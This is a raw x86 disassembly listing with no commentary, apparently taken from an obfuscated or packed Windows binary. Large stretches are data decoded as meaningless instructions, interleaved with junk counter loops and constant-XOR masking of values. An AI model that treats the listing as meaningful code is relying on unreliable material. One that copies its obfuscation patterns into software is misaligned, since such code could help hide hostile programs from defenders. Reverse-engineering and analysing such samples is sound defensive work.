  40e1ac:	mov    ebx,0xba0b0e5d
  40e1b1:	mov    BYTE PTR [ecx+0x3808e78d],0x1
  40e1b8:	sbb    DWORD PTR [ecx],edi
  40e1ba:	rcr    ecx,0xe6
  40e1bd:	sbb    eax,0xcc77f5ee
  40e1c2:	fidivr DWORD PTR [esi+0x6b]
  40e1c5:	sbb    BYTE PTR [ebp-0x6ad6a2e0],bl
  40e1cb:	or     ah,BYTE PTR [eax-0x12]
  40e1ce:	sbb    eax,0x4dbaa5d4
  40e1d3:	adc    dh,BYTE PTR [ecx-0x2d567728]
  40e1d9:	pop    di
  40e1db:	mov    ch,0x4c
  40e1dd:	data16 and cl,bh
  40e1e0:	out    0x35,al
  40e1e2:	(bad)
  40e1e5:	xor    DWORD PTR [esi+0x11],edi
  40e1e8:	or     ebp,edx
  40e1ea:	ss jp  0x37cce6c2
  40e1f1:	sti    
  40e1f2:	cmp    dh,BYTE PTR [eax]
  40e1f4:	jecxz  0x40e1fa
  40e1f6:	icebp  
  40e1f7:	xchg   edi,eax
  40e1f8:	dec    esi
  40e1f9:	shr    DWORD PTR [edi],0x84
  40e1fc:	xlat   BYTE PTR ds:[ebx]
  40e1fd:	push   ss
  40e1fe:	fldenv [ecx+0xf8d83e1]
  40e204:	jno    0x40e1ca
  40e206:	fwait
  40e207:	jg     0x40e262
  40e209:	nop
  40e20a:	xchg   ecx,eax
  40e20b:	or     bh,BYTE PTR [esi-0x32d7941b]
  40e211:	fwait
  40e212:	lahf   
  40e213:	mov    ecx,0x460bf52b
  40e218:	repz push ss
  40e21a:	jmp    0x40e26c
  40e21c:	fs pop edx
  40e21e:	(bad)  
  40e21f:	cmp    eax,0x9f35a89c
  40e224:	dec    esi
  40e225:	or     eax,0xbd9d67a2
  40e22a:	dec    edi
  40e22b:	adc    al,0xaf
  40e22d:	and    BYTE PTR [ebx],ah
  40e22f:	pop    ds
  40e230:	pop    eax
  40e231:	cli    
  40e232:	push   edx
  40e233:	cdq    
  40e234:	out    0x2f,eax
  40e236:	stc    
  40e237:	in     al,dx
  40e238:	leave  
  40e239:	call   0x2b40a56c
  40e23e:	xchg   ebp,eax
  40e23f:	sbb    eax,0x62b91fad
  40e244:	adc    esp,DWORD PTR [ecx+0x69]
  40e247:	pop    es
  40e248:	jo     0x40e252
  40e24a:	out    0xde,eax
  40e24c:	pop    ecx
  40e24d:	and    bl,BYTE PTR [ecx]
  40e24f:	test   al,0x7d
  40e251:	dec    eax
  40e252:	outs   dx,DWORD PTR ds:[esi]
  40e253:	pop    ds
  40e254:	or     esp,ebx
  40e256:	leave  
  40e257:	mov    bh,ah
  40e259:	pop    esp
  40e25a:	xor    DWORD PTR [edi+0x5c9dfe6d],ebx
  40e260:	mov    BYTE PTR [edx],ah
  40e262:	mov    edi,0xbda8b3e7
  40e267:	sbb    DWORD PTR [esi-0x19],0xbee5be9f
  40e26e:	retf   0x7cf4
  40e271:	ret    
  40e272:	dec    eax
  40e273:	call   0xbc21d4e2
  40e278:	inc    ebx
  40e279:	scas   eax,DWORD PTR es:[edi]
  40e27a:	and    ebx,esp
  40e27c:	or     eax,0x5274d4f0
  40e281:	stc    
  40e282:	fcomp  QWORD PTR [edx+0x53]
  40e285:	(bad)  
  40e286:	sbb    BYTE PTR [ecx],dh
  40e288:	add    eax,DWORD PTR [esi-0x7e9b196f]
  40e28e:	scas   eax,DWORD PTR es:[edi]
  40e28f:	dec    esi
  40e290:	pop    ecx
  40e291:	jnp    0x40e290
  40e293:	jmp    0x40e262
  40e295:	inc    eax
  40e296:	out    dx,eax
  40e297:	mov    ch,0x22
  40e299:	(bad)  
  40e29a:	icebp  
  40e29b:	int3   
  40e29c:	ins    BYTE PTR es:[edi],dx
  40e29d:	scas   eax,DWORD PTR es:[edi]
  40e29e:	fisubr DWORD PTR [eax+0x7c10bfa4]
  40e2a4:	ret    
  40e2a5:	loop   0x40e2ff
  40e2a7:	jbe    0x40e2d4
  40e2a9:	in     al,dx
  40e2aa:	mov    al,0xe5
  40e2ac:	mov    edx,0xf14ab33b
  40e2b1:	inc    ebx
  40e2b2:	cmp    ah,BYTE PTR [ecx-0x63]
  40e2b5:	out    dx,eax
  40e2b6:	mov    esi,0xa1534f3e
  40e2bb:	add    DWORD PTR [eax],ecx
  40e2bd:	test   al,0x57
  40e2bf:	sbb    bl,cl
  40e2c1:	xor    ah,bl
  40e2c3:	add    eax,0x9072d1ad
  40e2c8:	(bad)  
  40e2c9:	mov    eax,0xad151d2e
  40e2ce:	and    al,0xc3
  40e2d0:	mov    ebp,0x275e272e
  40e2d5:	mov    ah,0x66
  40e2d7:	(bad)  
  40e2d8:	add    ah,al
  40e2da:	pop    es
  40e2db:	call   0x5cdd935b
  40e2e0:	dec    esp
  40e2e1:	pop    ecx
  40e2e2:	sub    DWORD PTR [ebp+0x47],ebp
  40e2e5:	out    0x95,eax
  40e2e7:	add    eax,0xfcd29567
  40e2ec:	xchg   ebx,eax
  40e2ed:	push   ebp
  40e2ee:	test   al,0x74
  40e2f0:	sub    eax,0x398c0005
  40e2f5:	adc    BYTE PTR [esi+0x5673e578],dh
  40e2fb:	scas   eax,DWORD PTR es:[edi]
  40e2fc:	xchg   esi,eax
  40e2fd:	jb     0x40e364
  40e2ff:	(bad)  
  40e300:	loope  0x40e291
  40e302:	fcom   QWORD PTR [ebp+0x17]
  40e305:	lods   al,BYTE PTR ds:[esi]
  40e306:	in     eax,dx
  40e307:	inc    esp
  40e308:	push   0xffffffbf
  40e30a:	hlt    
  40e30b:	je     0x40e28f
  40e30d:	or     eax,0xa55dcee
  40e312:	pop    ds
  40e313:	sub    BYTE PTR [ebx+edx*2-0x2ad84a88],bl
  40e31a:	or     dl,BYTE PTR [edi+edx*4+0x42]
  40e31e:	cld    
  40e31f:	or     eax,0xb2ca114
  40e324:	sub    DWORD PTR [ebp-0x2080d0f1],edx
  40e32a:	js     0x40e37f
  40e32c:	iret   
  40e32d:	and    dh,BYTE PTR [edx+0x2b]
  40e330:	test   BYTE PTR ds:0xd2334b15,al
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	jmp    FWORD PTR [ebp+edx*1-0x5bc02885]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3fc
  40e3cc:	cs adc eax,0x7b85dfdf
  40e3d2:	pop    esp
  40e3d3:	aaa    
  40e3d4:	cmp    ch,BYTE PTR [ebx+0x10]
  40e3d7:	jbe    0x40e3d3
  40e3d9:	(bad)  
  40e3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3db:	ins    BYTE PTR es:[edi],dx
  40e3dc:	icebp  
  40e3dd:	loopne 0x40e361
  40e3df:	mov    ch,0x48
  40e3e1:	retf   0x9623
  40e3e4:	lods   eax,DWORD PTR ds:[esi]
  40e3e5:	inc    ebx
  40e3e6:	in     eax,dx
  40e3e7:	adc    bl,dh
  40e3e9:	mov    ch,0x2d
  40e3eb:	push   es
  40e3ec:	jg     0x40e42a
  40e3ee:	mov    eax,0x23ceacd
  40e3f3:	jbe    0x40e41c
  40e3f5:	out    dx,eax
  40e3f6:	jae    0x40e440
  40e3f8:	fistp  QWORD PTR [ecx+0x3a]
  40e3fb:	mov    al,ds:0xd6dc976d
  40e400:	fsubr  QWORD PTR [ecx+0x6b]
  40e403:	xlat   BYTE PTR ds:[ebx]
  40e404:	loope  0x40e42c
  40e406:	push   esi
  40e407:	in     eax,dx
  40e408:	mov    esp,esi
  40e40a:	add    DWORD PTR [edx-0x2a1ac234],esp
  40e410:	hlt    
  40e411:	xor    DWORD PTR [edi-0x41],ecx
  40e414:	les    ebx,FWORD PTR [ebp-0x16]
  40e417:	jne    0x40e3b9
  40e419:	inc    esp
  40e41a:	pushf  
  40e41b:	or     esi,edx
  40e41d:	sub    al,0x99
  40e41f:	in     eax,dx
  40e420:	xchg   edi,eax
  40e421:	jmp    0x8383:0x90c715f6
  40e428:	in     al,dx
  40e429:	arpl   WORD PTR [esi-0x61],bx
  40e42c:	ja     0x40e3c3
  40e42e:	push   DWORD PTR [ebx-0x61]
  40e431:	adc    al,0xf0
  40e433:	add    ebp,DWORD PTR [ebp+0x9]
  40e436:	nop
  40e437:	jg     0x40e3d2
  40e439:	(bad)
  40e43d:	out    0xb,eax
  40e43f:	rol    DWORD PTR [esi+0x37],1
  40e442:	inc    esp
  40e443:	or     eax,0x40b1342c
  40e448:	dec    eax
  40e449:	mov    bh,0xbe
  40e44b:	outs   dx,BYTE PTR ds:[esi]
  40e44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e44d:	push   edi
  40e44e:	xor    DWORD PTR [edi],ebx
  40e450:	add    DWORD PTR [ebp+eax*8+0x5b],edx
  40e454:	(bad)  
  40e455:	cmc    
  40e456:	jp     0x40e4c0
  40e458:	in     eax,dx
  40e459:	add    ah,BYTE PTR [edi+0x3790990a]
  40e45f:	jl     0x40e43b
  40e461:	adc    eax,esi
  40e463:	adc    BYTE PTR ss:[ecx-0x7d],bh
  40e467:	jne    0x40e431
  40e469:	inc    esp
  40e46a:	outs   dx,DWORD PTR ds:[esi]
  40e46b:	leave  
  40e46c:	pusha  
  40e46d:	scas   al,BYTE PTR es:[edi]
  40e46e:	jl     0x40e466
  40e470:	mov    esp,ecx
  40e472:	or     eax,0x241e9274
  40e477:	inc    ebx
  40e478:	sub    BYTE PTR [eax+edi*4+0x2dbcff45],dl
  40e47f:	push   ebx
  40e480:	or     eax,0xaecc1302
  40e485:	xor    BYTE PTR [edi],bl
  40e487:	nop
  40e488:	dec    edx
  40e489:	xlat   BYTE PTR ds:[ebx]
  40e48a:	push   es
  40e48b:	xchg   edx,eax
  40e48c:	cli    
  40e48d:	addr16 inc ebp
  40e48f:	jns    0x40e488
  40e491:	sbb    eax,0x9ce25e85
  40e496:	inc    esi
  40e497:	sub    ebx,DWORD PTR [edx]
  40e499:	lds    esi,FWORD PTR [edi+0x37]
  40e49c:	jno    0x40e472
  40e49e:	lds    eax,FWORD PTR [eax+0x61]
  40e4a1:	dec    esi
  40e4a2:	or     eax,0x6c5101c2
  40e4a7:	or     al,0xf
  40e4a9:	sub    ch,bh
  40e4ab:	mov    bh,0xb9
  40e4ad:	cld    
  40e4ae:	(bad)  
  40e4af:	in     eax,0x70
  40e4b1:	bound  edx,QWORD PTR [edx]
  40e4b3:	mov    ch,0xe4
  40e4b5:	inc    ebp
  40e4b6:	pmaxsw mm6,QWORD PTR [eax+edi*1-0x51b336f5]
  40e4be:	call   0xf6676168
  40e4c3:	push   ebp
  40e4c4:	mov    ds:0x8dca2fd3,eax
  40e4c9:	popa   
  40e4ca:	xchg   edi,eax
  40e4cb:	jbe    0x40e4f3
  40e4cd:	cmp    ah,bl
  40e4cf:	das    
  40e4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4d1:	and    al,0x1
  40e4d3:	jo     0x40e4fd
  40e4d5:	cwde   
  40e4d6:	push   ebp
  40e4d7:	jae    0x40e4a2
  40e4d9:	fsubp  st(1),st
  40e4db:	je     0x40e6db
  40e4e1:	add    DWORD PTR ds:0x433833,0x32bd
  40e4eb:	mov    eax,DWORD PTR [ebp-0x4]
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0xfe709328
  40e5c1:	not    DWORD PTR [ebx+0x7e7ea5cf]
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e5de
  40e5cc:	mov    edx,?
  40e5ce:	and    bh,BYTE PTR [edi-0xd]
  40e5d1:	scas   eax,DWORD PTR es:[edi]
  40e5d2:	dec    esp
  40e5d3:	retf   0x6247
  40e5d6:	inc    eax
  40e5d7:	mov    ebx,0xf42d4234
  40e5dc:	ss push ecx
  40e5de:	xor    DWORD PTR [edx],ecx
  40e5e0:	or     DWORD PTR [ecx-0x77e4bfab],edx
  40e5e6:	repnz pop edx
  40e5e8:	adc    BYTE PTR [edi+0x54012173],dh
  40e5ee:	neg    BYTE PTR [eax-0x30187e8c]
  40e5f4:	push   ds
  40e5f5:	push   ss
  40e5f6:	retf   0x7178
  40e5f9:	(bad)  
  40e5fa:	(bad)  
  40e5fb:	fldcw  WORD PTR [esi-0x71c778bf]
  40e601:	jns    0x40e5da
  40e603:	test   ecx,0x8985ea8e
  40e609:	dec    esp
  40e60a:	adc    al,cl
  40e60c:	xchg   DWORD PTR [ebx-0x36e5bd93],ebx
  40e612:	xor    eax,0x41c5da89
  40e617:	sbb    edx,DWORD PTR [edi+0x22]
  40e61a:	dec    esp
  40e61b:	or     eax,0xc15f1186
  40e620:	mov    ch,bl
  40e622:	nop
  40e623:	cmp    eax,0x679a02c5
  40e628:	adc    eax,0x37154a5f
  40e62d:	fwait
  40e62e:	stos   BYTE PTR es:[edi],al
  40e62f:	in     al,0xd8
  40e631:	xor    eax,0x70c8da81
  40e636:	or     edx,DWORD PTR [eax-0x1b41956f]
  40e63c:	call   0x7cc30a29
  40e641:	fadd   DWORD PTR [ebx+ebx*4]
  40e644:	fidivr DWORD PTR [eax-0x2deae1af]
  40e64a:	(bad)  
  40e64d:	nop
  40e64e:	call   0xd85c3975
  40e653:	icebp  
  40e654:	jl     0x40e5f8
  40e656:	cmp    BYTE PTR [edi],ah
  40e658:	aas    
  40e659:	test   DWORD PTR [esi],esp
  40e65b:	je     0x40e601
  40e65d:	push   edi
  40e65e:	stos   BYTE PTR es:[edi],al
  40e65f:	fisttp DWORD PTR [ebx+ebp*1]
  40e662:	xchg   ebx,eax
  40e663:	mov    esp,0xd7b924c3
  40e668:	stos   DWORD PTR es:[edi],eax
  40e669:	leave  
  40e66a:	and    eax,0x43de6d0
  40e66f:	push   ss
  40e670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e671:	push   esp
  40e672:	fadd   QWORD PTR [ecx-0x6eb58fdd]
  40e678:	add    al,0xd6
  40e67a:	xor    al,0x55
  40e67c:	cmp    eax,0x7ef77983
  40e681:	cmc    
  40e682:	cmp    ebp,ebp
  40e684:	addr16 mov ds:0x4005,eax
  40e688:	jmp    0x19e0:0xfeeda8e7
  40e68f:	sahf   
  40e690:	(bad)  
  40e692:	fdivr  QWORD PTR [eax+0x15]
  40e695:	xchg   esi,eax
  40e696:	(bad)
  40e699:	stc    
  40e69a:	cmp    eax,0xa2b736c2
  40e69f:	lock inc esp
  40e6a1:	adc    ecx,DWORD PTR [edi+0x422395b0]
  40e6a7:	mov    ds:0xf3786b1d,al
  40e6ac:	cmp    BYTE PTR [ebp-0x4a],al
  40e6af:	cmc    
  40e6b0:	repnz sti 
  40e6b2:	jmp    0xedbd0e1
  40e6b7:	and    ecx,edi
  40e6b9:	add    al,0xf7
  40e6bb:	sub    ebp,ebp
  40e6bd:	(bad)  
  40e6be:	fbld   TBYTE PTR [edx]
  40e6c0:	push   cs
  40e6c1:	xchg   ecx,eax
  40e6c2:	push   esi
  40e6c3:	inc    esp
  40e6c4:	adc    ebx,DWORD PTR [edi-0xf516664]
  40e6ca:	mov    dl,0x6a
  40e6cc:	adc    DWORD PTR [esp+esi*4+0x4c],esp
  40e6d0:	aaa    
  40e6d1:	in     al,0x27
  40e6d3:	or     BYTE PTR [ecx+0x39],cl
  40e6d6:	lahf   
  40e6d7:	xchg   ebp,eax
  40e6d8:	hlt    
  40e6d9:	ins    DWORD PTR es:[edi],dx
  40e6da:	push   eax
  40e6db:	mov    eax,DWORD PTR [ebp-0x4]
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0xc0d230a1
  40e707:	fnstenv [edi-0x21]
  40e70a:	mov    ds:0x7f0e7e7e,al
  40e70f:	jle    0x40e78f
  40e711:	sbb    DWORD PTR [ebp-0x77],ecx
  40e714:	push   ecx
  40e715:	enter  0xf17f,0xa7
  40e719:	xchg   DWORD PTR [ebp+0x12],edx
  40e71c:	xchg   edx,eax
  40e71d:	mov    ch,0xbd
  40e71f:	mov    DWORD PTR [ecx-0x33],0xd1a52453
  40e726:	jno    0x40e74e
  40e728:	fld    TBYTE PTR [esi+0x5]
  40e72b:	xchg   ecx,eax
  40e72c:	pop    esp
  40e72d:	jge    0x40e705
  40e72f:	inc    esp
  40e730:	out    dx,eax
  40e731:	jl     0x40e752
  40e733:	inc    edx
  40e734:	push   ebx
  40e735:	outs   dx,BYTE PTR ds:[esi]
  40e736:	xchg   DWORD PTR [esi],edi
  40e738:	test   al,0x2d
  40e73a:	dec    edi
  40e73b:	ja     0x40e737
  40e73d:	scas   eax,DWORD PTR es:[edi]
  40e73e:	in     al,dx
  40e73f:	inc    ebx
  40e740:	fild   DWORD PTR [edx-0x76]
  40e743:	cmc    
  40e744:	sub    DWORD PTR [esi],0x32ad1029
  40e74a:	mov    al,0xba
  40e74c:	sahf   
  40e74d:	test   al,0x14
  40e74f:	or     ebx,DWORD PTR [ebp-0x4014f47a]
  40e755:	cmp    edx,0x49f11f85
  40e75b:	jne    0x40e76c
  40e75d:	popf   
  40e75e:	or     esp,ecx
  40e760:	jmp    0x40e72d
  40e762:	cmp    DWORD PTR [ebx+edi*1-0x5d9dc058],eax
  40e769:	int    0x5a
  40e76b:	or     eax,0x1c7a360
  40e770:	mov    ch,0xbc
  40e772:	xchg   esp,eax
  40e773:	xor    ecx,esp
  40e775:	mov    ebx,0xb2144a65
  40e77a:	fidiv  WORD PTR [edx]
  40e77c:	bound  eax,QWORD PTR [edi-0x6]
  40e77f:	dec    edi
  40e780:	mov    ebp,0x20042a6d
  40e785:	leave  
  40e786:	ja     0x40e72f
  40e788:	jmp    0x7080:0x62cf51ce
  40e78f:	aaa    
  40e790:	jge    0x40e76f
  40e792:	(bad)  
  40e793:	cmp    ecx,eax
  40e795:	mov    al,0x4f
  40e797:	fadd   DWORD PTR [eax]
  40e799:	jmp    0x40e80a
  40e79b:	push   cs
  40e79c:	and    BYTE PTR [edx],ah
  40e79e:	inc    esi
  40e79f:	ins    BYTE PTR es:[edi],dx
  40e7a0:	pushf  
  40e7a1:	sbb    al,0x39
  40e7a3:	mov    eax,0x5fd5a2dd
  40e7a8:	dec    esp
  40e7a9:	cmp    ah,BYTE PTR ds:0x2f0b6678
  40e7af:	test   al,dh
  40e7b1:	in     al,dx
  40e7b2:	fs sar bh,1
  40e7b5:	(bad)  
  40e7b6:	shl    ch,0xa9
  40e7b9:	lds    eax,FWORD PTR [edi]
  40e7bb:	push   ds
  40e7bc:	lods   eax,DWORD PTR ds:[esi]
  40e7bd:	push   cs
  40e7be:	add    eax,0x12cdbb85
  40e7c3:	mov    dh,0x3d
  40e7c5:	addr16 in al,dx
  40e7c7:	mov    ah,0xd4
  40e7c9:	int3   
  40e7ca:	mov    eax,0xf6566547
  40e7cf:	sub    BYTE PTR [edi+ebp*2],bl
  40e7d2:	or     BYTE PTR [esi-0x2af74749],cl
  40e7d8:	dec    esp
  40e7d9:	idiv   DWORD PTR [eax+0x74]
  40e7dc:	pop    ss
  40e7dd:	neg    BYTE PTR ds:0xb2b215b4
  40e7e3:	adc    BYTE PTR [ebx],0xd4
  40e7e6:	pop    ecx
  40e7e7:	sub    eax,0xe3a610d2
  40e7ec:	cmp    al,0xdd
  40e7ee:	cmc    
  40e7ef:	ins    DWORD PTR es:[edi],dx
  40e7f0:	rcl    ebx,1
  40e7f2:	pusha  
  40e7f3:	pop    esi
  40e7f4:	push   0xffffffdd
  40e7f6:	pop    ss
  40e7f7:	aaa    
  40e7f8:	xor    eax,0x23675137
  40e7fd:	arpl   WORD PTR [edi-0x5c],bp
  40e800:	mov    dh,0xc9
  40e802:	rcl    BYTE PTR [edx+0x4],0x9b
  40e806:	mov    cl,0x91
  40e808:	les    ebp,FWORD PTR [ecx-0x3270c197]
  40e80e:	mov    ecx,0x72533a0d
  40e813:	sbb    al,0x16
  40e815:	jecxz  0x40e875
  40e817:	mov    esi,0x85222124
  40e81c:	sti    
  40e81d:	sub    DWORD PTR cs:[ebx-0x1b],ecx
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x84103a68,al
  40ea30:	outs   dx,DWORD PTR ds:[esi]
  40ea31:	jo     0x40e9bf
  40ea33:	out    dx,eax
  40ea34:	mov    ds:0x7c0e7e7e,eax
  40ea39:	jle    0x40eab9
  40ea3b:	mov    dh,0xe1
  40ea3d:	jge    0x40ea61
  40ea3f:	lods   eax,DWORD PTR ds:[esi]
  40ea40:	push   edi
  40ea41:	jecxz  0x40ea9a
  40ea43:	jge    0x40ea3a
  40ea45:	inc    edi
  40ea46:	imul   esp,DWORD PTR [eax-0x2b],0x38
  40ea4a:	inc    ebp
  40ea4b:	push   ecx
  40ea4c:	imul   eax,ecx,0x8e81392b
  40ea52:	add    al,0x87
  40ea54:	adc    eax,0xa1f6db1d
  40ea59:	sbb    eax,0x98ffd141
  40ea5e:	cmp    bl,BYTE PTR [edi+eiz*2+0x24]
  40ea62:	xchg   ecx,eax
  40ea63:	jo     0x40ea35
  40ea65:	and    eax,0xd3ad2005
  40ea6a:	xor    eax,0xf36f89fc
  40ea6f:	push   ebx
  40ea70:	repnz and ebp,DWORD PTR [ecx-0x6a]
  40ea74:	push   0xa
